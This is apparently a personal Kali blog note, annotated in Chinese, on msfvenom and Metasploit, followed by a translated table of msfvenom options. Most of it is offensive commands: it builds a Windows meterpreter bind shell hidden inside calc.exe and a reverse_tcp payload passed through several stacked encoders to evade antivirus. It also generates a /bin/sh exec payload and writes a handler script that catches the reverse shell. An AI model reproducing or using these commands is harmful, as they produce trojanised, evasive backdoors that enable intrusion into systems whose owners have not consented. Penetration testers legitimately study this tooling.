title: MSFVENOM
date: 1912-12
categories:
  - kali
tags: [笔记]
photos:
---
/usr/share/metasploit-framework/tools
cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
PAYLOAD windows/meterpreter/reverse_tcp
$MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" EXITFUNC=thread -f raw | 
$MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | 
$MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 --platform linux -f raw 2>/dev/null | 
$MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 --platform win -f raw 2>/dev/null |  
$MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 --platform win -f c > msf.c 2>/dev/null
 
 github/metasploitavevasion
<!--more-->         
msfconsole
show payload   
use linux/x64/exec
set cmd /bin/sh
generate -t py -b "/x00"


    echo ""
    echo 'use exploit/multi/handler' >> msfhandler.rc
    echo "set payload $PAYLOAD" >> msfhandler.rc
    echo "set LHOST $IP" >> msfhandler.rc
    echo "set LPORT $PORT" >> msfhandler.rc                                               
    echo 'exploit' >> msfhandler.rc
    $MSFCONSOLE -r msfhandler.rc
Options:
    -p, --payload    <payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#039;-&#039;或者stdin指定
    -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
    -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
    -f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
    -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
    -a, --arch       <architecture>  指定payload的目标架构
        --platform   <platform>      指定payload的目标平台
    -s, --space      <length>        设定有效攻击荷载的最大长度
    -b, --bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;
    -i, --iterations <count>         指定payload的编码次数
    -c, --add-code   <path>          指定一个附加的win32 shellcode文件
    -x, --template   <path>          指定一个自定义的可执行文件作为模板
    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
        --payload-options            列举payload的标准选项
    -o, --out   <path>               保存payload
    -v, --var-name <name>            指定一个自定义的变量，以确定输出格式
        --shellest                   最小化生成payload
    -h, --help                       查看帮助选项
        --help-formats               查看msf支持的输出格式列表

/usr/share/metasploit-framework/data/templates
